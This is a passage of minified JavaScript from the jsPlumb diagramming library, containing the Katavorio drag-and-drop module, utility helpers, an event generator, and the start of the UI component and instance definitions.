            Y("start", {el: this.el, pos: this.params.getPosition(u), e: a, drag: this})
        }, this.stop = function (a, b) {
            if (b || r) {
                var c = [], d = i.getSelection(), e = this.params.getPosition(u);
                if (d.length > 1) for (var f = 0; f < d.length; f++) {
                    var g = this.params.getPosition(d[f].el);
                    c.push([d[f].el, {left: g[0], top: g[1]}, d[f]])
                } else c.push([u, {left: e[0], top: e[1]}, this]);
                Y("stop", {el: u, pos: Z || e, finalPos: e, e: a, drag: this, selection: c})
            }
        }, this.mark = function (a) {
            m = this.params.getPosition(u), o = this.params.getPosition(u, !0), p = [o[0] - m[0], o[1] - m[1]], this.size = this.params.getSize(u), V = i.getMatchingDroppables(this), v(V, !0, !1, this), this.params.addClass(u, this.params.dragClass || c.drag);
            var b;
            b = this.params.getConstrainingRectangle ? this.params.getConstrainingRectangle(u) : this.params.getSize(u.parentNode), U = {
                w: b[0],
                h: b[1]
            }, a && i.notifySelectionDragStart(this)
        };
        var Z;
        this.unmark = function (a, d) {
            if (v(V, !1, !0, this), D && G(J) ? (Z = [u.offsetLeft, u.offsetTop], J.parentNode.removeChild(u), u = J) : Z = null, this.params.removeClass(u, this.params.dragClass || c.drag), V.length = 0, D = !1, !d) {
                W.length > 0 && Z && b.setPosition(J, Z), W.sort(F);
                for (var e = 0; e < W.length; e++) {
                    if (!0 === W[e].drop(this, a)) break
                }
            }
        }, this.moveBy = function (a, c, d) {
            W.length = 0;
            var e = this.toGrid([m[0] + a, m[1] + c]), f = M(e, u, U, this.size);
            if (G(this.el)) if (e[0] !== f[0] || e[1] !== f[1]) {
                if (!D) {
                    var g = H(J);
                    b.addClass(g, q.ghostProxy), J.parentNode.appendChild(g), u = g, D = !0
                }
                f = e
            } else D && (J.parentNode.removeChild(u), u = J, D = !1);
            var h = {x: f[0], y: f[1], w: this.size[0], h: this.size[1]},
                i = {x: h.x + p[0], y: h.y + p[1], w: h.w, h: h.h}, j = null;
            this.params.setPosition(u, f);
            for (var k = 0; k < V.length; k++) {
                var l = {x: V[k].pagePosition[0], y: V[k].pagePosition[1], w: V[k].size[0], h: V[k].size[1]};
                this.params.intersects(i, l) && (C || null == j || j === V[k].el) && V[k].canDrop(this) ? (j || (j = V[k].el), W.push(V[k]), V[k].setHover(this, !0, d)) : V[k].isHover() && V[k].setHover(this, !1, d)
            }
            Y("drag", {el: this.el, pos: f, e: d, drag: this})
        }, this.destroy = function () {
            this.params.unbind(this.el, "mousedown", this.downListener), this.params.unbind(document, "mousemove", this.moveListener), this.params.unbind(document, "mouseup", this.upListener), this.downListener = null, this.upListener = null, this.moveListener = null
        }, this.params.bind(this.el, "mousedown", this.downListener), this.params.handle ? T(this.params.handle, !1) : T(this.params.filter, this.params.filterExclude)
    }, D = function (a, b, c, d) {
        this._class = c.droppable, this.params = b || {}, this.rank = b.rank || 0, this._activeClass = this.params.activeClass || c.active, this._hoverClass = this.params.hoverClass || c.hover, z.apply(this, arguments);
        var e = !1;
        this.allowLoopback = !1 !== this.params.allowLoopback, this.setActive = function (a) {
            this.params[a ? "addClass" : "removeClass"](this.el, this._activeClass)
        }, this.updatePosition = function () {
            this.position = this.params.getPosition(this.el), this.pagePosition = this.params.getPosition(this.el, !0), this.size = this.params.getSize(this.el)
        }, this.canDrop = this.params.canDrop || function (a) {
            return !0
        }, this.isHover = function () {
            return e
        }, this.setHover = function (a, b, c) {
            (b || null == this.el._katavorioDragHover || this.el._katavorioDragHover === a.el._katavorio) && (this.params[b ? "addClass" : "removeClass"](this.el, this._hoverClass), this.el._katavorioDragHover = b ? a.el._katavorio : null, e !== b && this.params.events[b ? "over" : "out"]({
                el: this.el,
                e: c,
                drag: a,
                drop: this
            }), e = b)
        }, this.drop = function (a, b) {
            return this.params.events.drop({drag: a, e: b, drop: this})
        }, this.destroy = function () {
            this._class = null, this._activeClass = null, this._hoverClass = null, e = null
        }
    }, E = function () {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (a) {
            var b = 16 * Math.random() | 0;
            return ("x" === a ? b : 3 & b | 8).toString(16)
        })
    }, F = function (a, b) {
        return a.rank < b.rank ? 1 : a.rank > b.rank ? -1 : 0
    }, G = function (a) {
        return null == a ? null : null == (a = "string" == typeof a || a.constructor === String ? document.getElementById(a) : a) ? null : (a._katavorio = a._katavorio || E(), a)
    };
    a.Katavorio = function (a) {
        var f = [], g = {};
        this._dragsByScope = {}, this._dropsByScope = {};
        var h = 1, i = function (a, b) {
            w(a, function (a) {
                for (var c = 0; c < a.scopes.length; c++) b[a.scopes[c]] = b[a.scopes[c]] || [], b[a.scopes[c]].push(a)
            })
        }, j = function (b, c) {
            var d = 0;
            return w(b, function (b) {
                for (var e = 0; e < b.scopes.length; e++) if (c[b.scopes[e]]) {
                    var f = a.indexOf(c[b.scopes[e]], b);
                    -1 !== f && (c[b.scopes[e]].splice(f, 1), d++)
                }
            }), d > 0
        }, k = (this.getMatchingDroppables = function (a) {
            for (var b = [], c = {}, d = 0; d < a.scopes.length; d++) {
                var e = this._dropsByScope[a.scopes[d]];
                if (e) for (var f = 0; f < e.length; f++) !e[f].canDrop(a) || c[e[f].uuid] || !e[f].allowLoopback && e[f].el === a.el || (c[e[f].uuid] = !0, b.push(e[f]))
            }
            return b.sort(F), b
        }, function (b) {
            b = b || {};
            var c, d = {events: {}};
            for (c in a) d[c] = a[c];
            for (c in b) d[c] = b[c];
            for (c = 0; c < r.length; c++) d.events[r[c]] = b[r[c]] || s;
            return d.katavorio = this, d
        }.bind(this)), l = function (a, b) {
            for (var c = 0; c < r.length; c++) b[r[c]] && a.on(r[c], b[r[c]])
        }.bind(this), m = {}, n = a.css || {}, o = a.scope || "katavorio-drag-scope";
        for (var p in q) m[p] = q[p];
        for (var p in n) m[p] = n[p];
        var t = a.inputFilterSelector || "input,textarea,select,button,option";
        this.getInputFilterSelector = function () {
            return t
        }, this.setInputFilterSelector = function (a) {
            return t = a, this
        }, this.draggable = function (b, c) {
            var d = [];
            return w(b, function (b) {
                if (null != (b = G(b))) if (null == b._katavorioDrag) {
                    var e = k(c);
                    b._katavorioDrag = new C(b, e, m, o), i(b._katavorioDrag, this._dragsByScope), d.push(b._katavorioDrag), a.addClass(b, m.draggable)
                } else l(b._katavorioDrag, c)
            }.bind(this)), d
        }, this.droppable = function (b, c) {
            var d = [];
            return w(b, function (b) {
                if (null != (b = G(b))) {
                    var e = new D(b, k(c), m, o);
                    b._katavorioDrop = b._katavorioDrop || [], b._katavorioDrop.push(e), i(e, this._dropsByScope), d.push(e), a.addClass(b, m.droppable)
                }
            }.bind(this)), d
        }, this.select = function (b) {
            return w(b, function () {
                var b = G(this);
                b && b._katavorioDrag && (g[b._katavorio] || (f.push(b._katavorioDrag), g[b._katavorio] = [b, f.length - 1], a.addClass(b, m.selected)))
            }), this
        }, this.deselect = function (b) {
            return w(b, function () {
                var b = G(this);
                if (b && b._katavorio && g[b._katavorio]) {
                    for (var c = [], d = 0; d < f.length; d++) f[d].el !== b && c.push(f[d]);
                    f = c, delete g[b._katavorio], a.removeClass(b, m.selected)
                }
            }), this
        }, this.deselectAll = function () {
            for (var b in g) {
                var c = g[b];
                a.removeClass(c[0], m.selected)
            }
            f.length = 0, g = {}
        }, this.markSelection = function (a) {
            u(f, function (a) {
                a.mark()
            }, a)
        }, this.markPosses = function (a) {
            a.posses && w(a.posses, function (b) {
                a.posseRoles[b] && A[b] && u(A[b].members, function (a) {
                    a.mark()
                }, a)
            })
        }, this.unmarkSelection = function (a, b) {
            u(f, function (a) {
                a.unmark(b)
            }, a)
        }, this.unmarkPosses = function (a, b) {
            a.posses && w(a.posses, function (c) {
                a.posseRoles[c] && A[c] && u(A[c].members, function (a) {
                    a.unmark(b, !0)
                }, a)
            })
        }, this.getSelection = function () {
            return f.slice(0)
        }, this.updateSelection = function (a, b, c) {
            u(f, function (c) {
                c.moveBy(a, b)
            }, c)
        };
        var v = function (a, b) {
            b.posses && w(b.posses, function (c) {
                b.posseRoles[c] && A[c] && u(A[c].members, function (b) {
                    a(b)
                }, b)
            })
        };
        this.updatePosses = function (a, b, c) {
            v(function (c) {
                c.moveBy(a, b)
            }, c)
        }, this.notifyPosseDragStop = function (a, b) {
            v(function (a) {
                a.stop(b, !0)
            }, a)
        }, this.notifySelectionDragStop = function (a, b) {
            u(f, function (a) {
                a.stop(b, !0)
            }, a)
        }, this.notifySelectionDragStart = function (a, b) {
            u(f, function (a) {
                a.notifyStart(b)
            }, a)
        }, this.setZoom = function (a) {
            h = a
        }, this.getZoom = function () {
            return h
        };
        var x = function (a, b, c, d) {
            w(a, function (a) {
                j(a, c), a[d](b), i(a, c)
            })
        };
        w(["set", "add", "remove", "toggle"], function (a) {
            this[a + "Scope"] = function (b, c) {
                x(b._katavorioDrag, c, this._dragsByScope, a + "Scope"), x(b._katavorioDrop, c, this._dropsByScope, a + "Scope")
            }.bind(this), this[a + "DragScope"] = function (b, c) {
                x(b.constructor === C ? b : b._katavorioDrag, c, this._dragsByScope, a + "Scope")
            }.bind(this), this[a + "DropScope"] = function (b, c) {
                x(b.constructor === D ? b : b._katavorioDrop, c, this._dropsByScope, a + "Scope")
            }.bind(this)
        }.bind(this)), this.snapToGrid = function (a, b) {
            for (var c in this._dragsByScope) u(this._dragsByScope[c], function (c) {
                c.snap(a, b)
            })
        }, this.getDragsForScope = function (a) {
            return this._dragsByScope[a]
        }, this.getDropsForScope = function (a) {
            return this._dropsByScope[a]
        };
        var y = function (a, b, c) {
            if (a = G(a), a[b]) {
                var d = f.indexOf(a[b]);
                d >= 0 && f.splice(d, 1), j(a[b], c) && w(a[b], function (a) {
                    a.destroy()
                }), delete a[b]
            }
        }, z = function (a, b, c, d) {
            a = G(a), a[b] && a[b].off(c, d)
        };
        this.elementRemoved = function (a) {
            this.destroyDraggable(a), this.destroyDroppable(a)
        }, this.destroyDraggable = function (a, b, c) {
            1 === arguments.length ? y(a, "_katavorioDrag", this._dragsByScope) : z(a, "_katavorioDrag", b, c)
        }, this.destroyDroppable = function (a, b, c) {
            1 === arguments.length ? y(a, "_katavorioDrop", this._dropsByScope) : z(a, "_katavorioDrop", b, c)
        }, this.reset = function () {
            this._dragsByScope = {}, this._dropsByScope = {}, f = [], g = {}, A = {}
        };
        var A = {}, B = function (a, c, d) {
            var f = e(c) ? c : c.id, g = !!e(c) || !1 !== c.active, h = A[f] || function () {
                var a = {name: f, members: []};
                return A[f] = a, a
            }();
            return w(a, function (a) {
                if (a._katavorioDrag) {
                    if (d && null != a._katavorioDrag.posseRoles[h.name]) return;
                    b(h.members, a._katavorioDrag), b(a._katavorioDrag.posses, h.name), a._katavorioDrag.posseRoles[h.name] = g
                }
            }), h
        };
        this.addToPosse = function (a, b) {
            for (var c = [], d = 1; d < arguments.length; d++) c.push(B(a, arguments[d]));
            return 1 === c.length ? c[0] : c
        }, this.setPosse = function (a, b) {
            for (var c = [], e = 1; e < arguments.length; e++) c.push(B(a, arguments[e], !0).name);
            return w(a, function (a) {
                if (a._katavorioDrag) {
                    var b = d(a._katavorioDrag.posses, c), e = [];
                    Array.prototype.push.apply(e, a._katavorioDrag.posses);
                    for (var f = 0; f < b.length; f++) this.removeFromPosse(a, b[f])
                }
            }.bind(this)), 1 === c.length ? c[0] : c
        }, this.removeFromPosse = function (a, b) {
            if (arguments.length < 2) throw new TypeError("No posse id provided for remove operation");
            for (var d = 1; d < arguments.length; d++) b = arguments[d], w(a, function (a) {
                if (a._katavorioDrag && a._katavorioDrag.posses) {
                    var d = a._katavorioDrag;
                    w(b, function (a) {
                        c(A[a].members, d), c(d.posses, a), delete d.posseRoles[a]
                    })
                }
            })
        }, this.removeFromAllPosses = function (a) {
            w(a, function (a) {
                if (a._katavorioDrag && a._katavorioDrag.posses) {
                    var b = a._katavorioDrag;
                    w(b.posses, function (a) {
                        c(A[a].members, b)
                    }), b.posses.length = 0, b.posseRoles = {}
                }
            })
        }, this.setPosseState = function (a, b, c) {
            var d = A[b];
            d && w(a, function (a) {
                a._katavorioDrag && a._katavorioDrag.posses && (a._katavorioDrag.posseRoles[d.name] = c)
            })
        }
    }, a.Katavorio.version = "1.0.0", "undefined" != typeof exports && (exports.Katavorio = a.Katavorio)
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";

    function a(a) {
        return "[object Array]" === Object.prototype.toString.call(a)
    }

    function b(a) {
        return "[object Number]" === Object.prototype.toString.call(a)
    }

    function c(a) {
        return "string" == typeof a
    }

    function d(a) {
        return "boolean" == typeof a
    }

    function e(a) {
        return null == a
    }

    function f(a) {
        return null != a && "[object Object]" === Object.prototype.toString.call(a)
    }

    function g(a) {
        return "[object Date]" === Object.prototype.toString.call(a)
    }

    function h(a) {
        return "[object Function]" === Object.prototype.toString.call(a)
    }

    function i(a) {
        return h(a) && null != a.name && a.name.length > 0
    }

    function j(a) {
        for (var b in a) if (a.hasOwnProperty(b)) return !1;
        return !0
    }

    function k(b) {
        if (c(b)) return "" + b;
        if (d(b)) return !!b;
        if (g(b)) return new Date(b.getTime());
        if (h(b)) return b;
        if (a(b)) {
            for (var e = [], i = 0; i < b.length; i++) e.push(k(b[i]));
            return e
        }
        if (f(b)) {
            var j = {};
            for (var l in b) j[l] = k(b[l]);
            return j
        }
        return b
    }

    function l(b, e, g) {
        var h, i, j = {};
        for (g = g || [], i = 0; i < g.length; i++) j[g[i]] = !0;
        var l = k(b);
        for (i in e) if (null == l[i]) l[i] = e[i]; else if (c(e[i]) || d(e[i])) j[i] ? (h = [], h.push.apply(h, a(l[i]) ? l[i] : [l[i]]), h.push.apply(h, d(e[i]) ? e[i] : [e[i]]), l[i] = h) : l[i] = e[i]; else if (a(e[i])) h = [], a(l[i]) && h.push.apply(h, l[i]), h.push.apply(h, e[i]), l[i] = h; else if (f(e[i])) {
            f(l[i]) || (l[i] = {});
            for (var m in e[i]) l[i][m] = e[i][m]
        }
        return l
    }

    function m(a, b, c) {
        if (null != a) {
            var d = a, e = d;
            return b.replace(/([^\.])+/g, function (a, b, d, f) {
                var g = a.match(/([^\[0-9]+){1}(\[)([0-9+])/), h = d + a.length >= f.length, i = function () {
                    return e[g[1]] || function () {
                        return e[g[1]] = [], e[g[1]]
                    }()
                };
                if (h) g ? i()[g[3]] = c : e[a] = c; else if (g) {
                    var j = i();
                    e = j[g[3]] || function () {
                        return j[g[3]] = {}, j[g[3]]
                    }()
                } else e = e[a] || function () {
                    return e[a] = {}, e[a]
                }();
                return ""
            }), a
        }
    }

    function n(a, b, c) {
        for (var d = 0; d < c.length; d++) {
            var e = c[d][0][c[d][1]].apply(c[d][0], c[d][2]);
            if (e === b) return e
        }
        return a
    }

    function o(b, d, e, g) {
        var i = function (a) {
            var b = a.match(/(\${.*?})/g);
            if (null != b) for (var c = 0; c < b.length; c++) {
                var e = d[b[c].substring(2, b[c].length - 1)] || "";
                null != e && (a = a.replace(b[c], e))
            }
            return a
        }, j = function (b) {
            if (null != b) {
                if (c(b)) return i(b);
                if (!h(b) || g || null != e && 0 !== (b.name || "").indexOf(e)) {
                    if (a(b)) {
                        for (var k = [], l = 0; l < b.length; l++) k.push(j(b[l]));
                        return k
                    }
                    if (f(b)) {
                        var m = {};
                        for (var n in b) m[n] = j(b[n]);
                        return m
                    }
                    return b
                }
                return b(d)
            }
        };
        return j(b)
    }

    function p(a, b) {
        if (a) for (var c = 0; c < a.length; c++) if (b(a[c])) return c;
        return -1
    }

    function q(a, b) {
        var c = p(a, b);
        return c > -1 && a.splice(c, 1), -1 !== c
    }

    function r(a, b) {
        var c = a.indexOf(b);
        return c > -1 && a.splice(c, 1), -1 !== c
    }

    function s(a, b, c) {
        -1 === p(a, c) && a.push(b)
    }

    function t(a, b, c, d) {
        var e = a[b];
        return null == e && (e = [], a[b] = e), e[d ? "unshift" : "push"](c), e
    }

    function u(a, b, c) {
        return -1 === a.indexOf(b) && (c ? a.unshift(b) : a.push(b), !0)
    }

    function v(b, c, d) {
        var e;
        c = a(c) ? c : [c];
        var f = function (a) {
            for (var c = a.__proto__; null != c;) if (null != c.prototype) {
                for (var d in c.prototype) c.prototype.hasOwnProperty(d) && !b.prototype.hasOwnProperty(d) && (b.prototype[d] = c.prototype[d]);
                c = c.prototype.__proto__
            } else c = null
        };
        for (e = 0; e < c.length; e++) {
            for (var g in c[e].prototype) c[e].prototype.hasOwnProperty(g) && !b.prototype.hasOwnProperty(g) && (b.prototype[g] = c[e].prototype[g]);
            f(c[e])
        }
        var h = function (a, b) {
            return function () {
                for (e = 0; e < c.length; e++) c[e].prototype[a] && c[e].prototype[a].apply(this, arguments);
                return b.apply(this, arguments)
            }
        }, i = function (a) {
            for (var c in a) b.prototype[c] = h(c, a[c])
        };
        if (arguments.length > 2) for (e = 2; e < arguments.length; e++) i(arguments[e]);
        return b
    }

    function w() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (a) {
            var b = 16 * Math.random() | 0;
            return ("x" === a ? b : 3 & b | 8).toString(16)
        })
    }

    function x(a) {
        if (null == a) return null;
        for (var b = a.replace(/^\s\s*/, ""), c = /\s/, d = b.length; c.test(b.charAt(--d));) ;
        return b.slice(0, d + 1)
    }

    function y(a, b) {
        a = null == a.length || "string" == typeof a ? [a] : a;
        for (var c = 0; c < a.length; c++) b(a[c])
    }

    function z(a, b) {
        for (var c = [], d = 0; d < a.length; d++) c.push(b(a[d]));
        return c
    }

    function A(a, b, c) {
        c = c || "parent";
        var d = function (a) {
            return a ? b[a] : null
        }, e = function (a) {
            return a ? d(a[c]) : null
        }, f = function (a, b) {
            if (null == a) return b;
            var c = l(a, b);
            return f(e(a), c)
        }, g = function (a) {
            if (null == a) return {};
            if ("string" == typeof a) return d(a);
            if (a.length) {
                for (var b = !1, c = 0, e = void 0; !b && c < a.length;) e = g(a[c]), e ? b = !0 : c++;
                return e
            }
        }, h = g(a);
        return h ? f(e(h), h) : {}
    }

    function B() {
        for (var a = [], b = 0; b < arguments.length; b++) a[b] = arguments[b];
        if (F && "undefined" != typeof console) try {
            var c = arguments[arguments.length - 1];
            console.log(c)
        } catch (a) {
        }
    }

    function C(a, b, c) {
        return function () {
            var d = null;
            try {
                null != b && (d = b.apply(this, arguments))
            } catch (a) {
                B("jsPlumb function failed : " + a)
            }
            if (null != a && (null == c || d !== c)) try {
                d = a.apply(this, arguments)
            } catch (a) {
                B("wrapped function failed : " + a)
            }
            return d
        }
    }

    var D = this, E = D.jsPlumbUtil = {}, F = !0, G = function () {
        function a() {
            var a = this;
            this._listeners = {}, this.eventsSuspended = !1, this.tick = !1, this.eventsToDieOn = {ready: !0}, this.queue = [], this.bind = function (b, c, d) {
                var e = function (b) {
                    t(a._listeners, b, c, d), c.__jsPlumb = c.__jsPlumb || {}, c.__jsPlumb[w()] = b
                };
                if ("string" == typeof b) e(b); else if (null != b.length) for (var f = 0; f < b.length; f++) e(b[f]);
                return a
            }, this.fire = function (a, b, c) {
                if (this.tick) this.queue.unshift(arguments); else {
                    if (this.tick = !0, !this.eventsSuspended && this._listeners[a]) {
                        var d = this._listeners[a].length, e = 0, f = !1, g = null;
                        if (!this.shouldFireEvent || this.shouldFireEvent(a, b, c)) for (; !f && e < d && !1 !== g;) {
                            if (this.eventsToDieOn[a]) this._listeners[a][e].apply(this, [b, c]); else try {
                                g = this._listeners[a][e].apply(this, [b, c])
                            } catch (b) {
                                B("jsPlumb: fire failed for event " + a + " : " + b)
                            }
                            e++, null != this._listeners && null != this._listeners[a] || (f = !0)
                        }
                    }
                    this.tick = !1, this._drain()
                }
                return this
            }, this._drain = function () {
                var b = a.queue.pop();
                b && a.fire.apply(a, b)
            }, this.unbind = function (a, b) {
                if (0 === arguments.length) this._listeners = {}; else if (1 === arguments.length) {
                    if ("string" == typeof a) delete this._listeners[a]; else if (a.__jsPlumb) {
                        var c = void 0;
                        for (var d in a.__jsPlumb) c = a.__jsPlumb[d], r(this._listeners[c] || [], a)
                    }
                } else 2 === arguments.length && r(this._listeners[a] || [], b);
                return this
            }, this.getListener = function (b) {
                return a._listeners[b]
            }, this.setSuspendEvents = function (b) {
                a.eventsSuspended = b
            }, this.isSuspendEvents = function () {
                return a.eventsSuspended
            }, this.silently = function (b) {
                a.setSuspendEvents(!0);
                try {
                    b()
                } catch (a) {
                    B("Cannot execute silent function " + a)
                }
                a.setSuspendEvents(!1)
            }, this.cleanupListeners = function () {
                for (var b in a._listeners) a._listeners[b] = null
            }
        }

        return a
    }();
    E.isArray = a, E.isNumber = b, E.isString = c, E.isBoolean = d, E.isNull = e, E.isObject = f, E.isDate = g, E.isFunction = h, E.isNamedFunction = i, E.isEmpty = j, E.clone = k, E.merge = l, E.replace = m, E.functionChain = n, E.populate = o, E.findWithFunction = p, E.removeWithFunction = q, E.remove = r, E.addWithFunction = s, E.addToList = t, E.suggest = u, E.extend = v, E.uuid = w, E.fastTrim = x, E.each = y, E.map = z, E.mergeWithParents = A, E.logEnabled = F, E.log = B, E.wrap = C, E.EventGenerator = G
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this;
    a.jsPlumbUtil.matchesSelector = function (a, b, c) {
        c = c || a.parentNode;
        for (var d = c.querySelectorAll(b), e = 0; e < d.length; e++) if (d[e] === a) return !0;
        return !1
    }, a.jsPlumbUtil.consume = function (a, b) {
        a.stopPropagation ? a.stopPropagation() : a.returnValue = !1, !b && a.preventDefault && a.preventDefault()
    }, a.jsPlumbUtil.sizeElement = function (a, b, c, d, e) {
        a && (a.style.height = e + "px", a.height = e, a.style.width = d + "px", a.width = d, a.style.left = b + "px", a.style.top = c + "px")
    }
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumbUtil, c = function () {
            return "" + (new Date).getTime()
        }, d = function (a) {
            if (a._jsPlumb.paintStyle && a._jsPlumb.hoverPaintStyle) {
                var b = {};
                p.extend(b, a._jsPlumb.paintStyle), p.extend(b, a._jsPlumb.hoverPaintStyle), delete a._jsPlumb.hoverPaintStyle, b.gradient && a._jsPlumb.paintStyle.fill && delete b.gradient, a._jsPlumb.hoverPaintStyle = b
            }
        },
        e = ["tap", "dbltap", "click", "dblclick", "mouseover", "mouseout", "mousemove", "mousedown", "mouseup", "contextmenu"],
        f = function (a, b, c, d) {
            var e = a.getAttachedElements();
            if (e) for (var f = 0, g = e.length; f < g; f++) d && d === e[f] || e[f].setHover(b, !0, c)
        }, g = function (a) {
            return null == a ? null : a.split(" ")
        }, h = function (a, b, c) {
            for (var d in b) a[d] = c
        }, i = function (a, c) {
            c = b.isArray(c) || null != c.length && !b.isString(c) ? c : [c];
            for (var d = 0; d < c.length; d++) try {
                a.apply(c[d], [c[d]])
            } catch (a) {
                b.log(".each iteration failed : " + a)
            }
        }, j = function (a, c, d) {
            if (a.getDefaultType) {
                var e = a.getTypeDescriptor(), f = {}, g = a.getDefaultType(), i = b.merge({}, g);
                h(f, g, "__default");
                for (var j = 0, k = a._jsPlumb.types.length; j < k; j++) {
                    var l = a._jsPlumb.types[j];
                    if ("__default" !== l) {
                        var m = a._jsPlumb.instance.getType(l, e);
                        null != m && (i = b.merge(i, m, ["cssClass"]), h(f, m, l))
                    }
                }
                c && (i = b.populate(i, c, "_")), a.applyType(i, d, f), d || a.repaint()
            }
        }, k = a.jsPlumbUIComponent = function (a) {
            b.EventGenerator.apply(this, arguments);
            var c = this, d = arguments, e = c.idPrefix, f = e + (new Date).getTime();
            this._jsPlumb = {
                instance: a._jsPlumb,
                parameters: a.parameters || {},
                paintStyle: null,
                hoverPaintStyle: null,
                paintStyleInUse: null,
                hover: !1,
                beforeDetach: a.beforeDetach,
                beforeDrop: a.beforeDrop,
                overlayPlacements: [],
                hoverClass: a.hoverClass || a._jsPlumb.Defaults.HoverClass,
                types: [],
                typeCache: {}
            }, this.cacheTypeItem = function (a, b, c) {
                this._jsPlumb.typeCache[c] = this._jsPlumb.typeCache[c] || {}, this._jsPlumb.typeCache[c][a] = b
            }, this.getCachedTypeItem = function (a, b) {
                return this._jsPlumb.typeCache[b] ? this._jsPlumb.typeCache[b][a] : null
            }, this.getId = function () {
                return f
            };
            var g = a.overlays || [], h = {};
            if (this.defaultOverlayKeys) {
                for (var i = 0; i < this.defaultOverlayKeys.length; i++) Array.prototype.push.apply(g, this._jsPlumb.instance.Defaults[this.defaultOverlayKeys[i]] || []);
                for (i = 0; i < g.length; i++) {
                    var j = p.convertToFullOverlaySpec(g[i]);
                    h[j[1].id] = j
                }
            }
            var k = {
                overlays: h,
                parameters: a.parameters || {},
                scope: a.scope || this._jsPlumb.instance.getDefaultScope()
            };
            if (this.getDefaultType = function () {
                return k
            }, this.appendToDefaultType = function (a) {
                for (var b in a) k[b] = a[b]
            }, a.events) for (var l in a.events) c.bind(l, a.events[l]);
            this.clone = function () {
                var a = Object.create(this.constructor.prototype);
                return this.constructor.apply(a, d), a
            }.bind(this), this.isDetachAllowed = function (a) {
                var c = !0;
                if (this._jsPlumb.beforeDetach) try {
                    c = this._jsPlumb.beforeDetach(a)
                } catch (a) {
                    b.log("jsPlumb: beforeDetach callback failed", a)
                }
                return c
            }, this.isDropAllowed = function (a, c, d, e, f, g, h) {
                var i = this._jsPlumb.instance.checkCondition("beforeDrop", {
                    sourceId: a,
                    targetId: c,
                    scope: d,
                    connection: e,
                    dropEndpoint: f,
                    source: g,
                    target: h
                });
                if (this._jsPlumb.beforeDrop) try {
                    i = this._jsPlumb.beforeDrop({
                        sourceId: a,
                        targetId: c,
                        scope: d,
                        connection: e,
                        dropEndpoint: f,
                        source: g,
                        target: h
                    })
                } catch (a) {
                    b.log("jsPlumb: beforeDrop callback failed", a)
                }
                return i
            };
            var m = [];
            this.setListenerComponent = function (a) {
                for (var b = 0; b < m.length; b++) m[b][3] = a
            }
        }, l = function (a, b) {
            var c = a._jsPlumb.types[b], d = a._jsPlumb.instance.getType(c, a.getTypeDescriptor());
            null != d && d.cssClass && a.canvas && a._jsPlumb.instance.removeClass(a.canvas, d.cssClass)
        };
    b.extend(a.jsPlumbUIComponent, b.EventGenerator, {
        getParameter: function (a) {
            return this._jsPlumb.parameters[a]
        }, setParameter: function (a, b) {
            this._jsPlumb.parameters[a] = b
        }, getParameters: function () {
            return this._jsPlumb.parameters
        }, setParameters: function (a) {
            this._jsPlumb.parameters = a
        }, getClass: function () {
            return p.getClass(this.canvas)
        }, hasClass: function (a) {
            return p.hasClass(this.canvas, a)
        }, addClass: function (a) {
            p.addClass(this.canvas, a)
        }, removeClass: function (a) {
            p.removeClass(this.canvas, a)
        }, updateClasses: function (a, b) {
            p.updateClasses(this.canvas, a, b)
        }, setType: function (a, b, c) {
            this.clearTypes(), this._jsPlumb.types = g(a) || [], j(this, b, c)
        }, getType: function () {
            return this._jsPlumb.types
        }, reapplyTypes: function (a, b) {
            j(this, a, b)
        }, hasType: function (a) {
            return -1 !== this._jsPlumb.types.indexOf(a)
        }, addType: function (a, b, c) {
            var d = g(a), e = !1;
            if (null != d) {
                for (var f = 0, h = d.length; f < h; f++) this.hasType(d[f]) || (this._jsPlumb.types.push(d[f]), e = !0);
                e && j(this, b, c)
            }
        }, removeType: function (a, b, c) {
            var d = g(a), e = !1, f = function (a) {
                var b = this._jsPlumb.types.indexOf(a);
                return -1 !== b && (l(this, b), this._jsPlumb.types.splice(b, 1), !0)
            }.bind(this);
            if (null != d) {
                for (var h = 0, i = d.length; h < i; h++) e = f(d[h]) || e;
                e && j(this, b, c)
            }
        }, clearTypes: function (a, b) {
            for (var c = this._jsPlumb.types.length, d = 0; d < c; d++) l(this, 0), this._jsPlumb.types.splice(0, 1);
            j(this, a, b)
        }, toggleType: function (a, b, c) {
            var d = g(a);
            if (null != d) {
                for (var e = 0, f = d.length; e < f; e++) {
                    var h = this._jsPlumb.types.indexOf(d[e]);
                    -1 !== h ? (l(this, h), this._jsPlumb.types.splice(h, 1)) : this._jsPlumb.types.push(d[e])
                }
                j(this, b, c)
            }
        }, applyType: function (a, b) {
            if (this.setPaintStyle(a.paintStyle, b), this.setHoverPaintStyle(a.hoverPaintStyle, b), a.parameters) for (var c in a.parameters) this.setParameter(c, a.parameters[c]);
            this._jsPlumb.paintStyleInUse = this.getPaintStyle()
        }, setPaintStyle: function (a, b) {
            this._jsPlumb.paintStyle = a, this._jsPlumb.paintStyleInUse = this._jsPlumb.paintStyle, d(this), b || this.repaint()
        }, getPaintStyle: function () {
            return this._jsPlumb.paintStyle
        }, setHoverPaintStyle: function (a, b) {
            this._jsPlumb.hoverPaintStyle = a, d(this), b || this.repaint()
        }, getHoverPaintStyle: function () {
            return this._jsPlumb.hoverPaintStyle
        }, destroy: function (a) {
            (a || null == this.typeId) && (this.cleanupListeners(), this.clone = null, this._jsPlumb = null)
        }, isHover: function () {
            return this._jsPlumb.hover
        }, setHover: function (a, b, d) {
            if (this._jsPlumb && !this._jsPlumb.instance.currentlyDragging && !this._jsPlumb.instance.isHoverSuspended()) {
                this._jsPlumb.hover = a;
                var e = a ? "addClass" : "removeClass";
                null != this.canvas && (null != this._jsPlumb.instance.hoverClass && this._jsPlumb.instance[e](this.canvas, this._jsPlumb.instance.hoverClass), null != this._jsPlumb.hoverClass && this._jsPlumb.instance[e](this.canvas, this._jsPlumb.hoverClass)), null != this._jsPlumb.hoverPaintStyle && (this._jsPlumb.paintStyleInUse = a ? this._jsPlumb.hoverPaintStyle : this._jsPlumb.paintStyle, this._jsPlumb.instance.isSuspendDrawing() || (d = d || c(), this.repaint({
                    timestamp: d,
                    recalc: !1
                }))), this.getAttachedElements && !b && f(this, a, c(), this)
            }
        }
    });
    var m = 0, n = function () {
        var a = m + 1;
        return m++, a
    }, o = a.jsPlumbInstance = function (d) {
        this.version = "2.7.16", this.Defaults = {
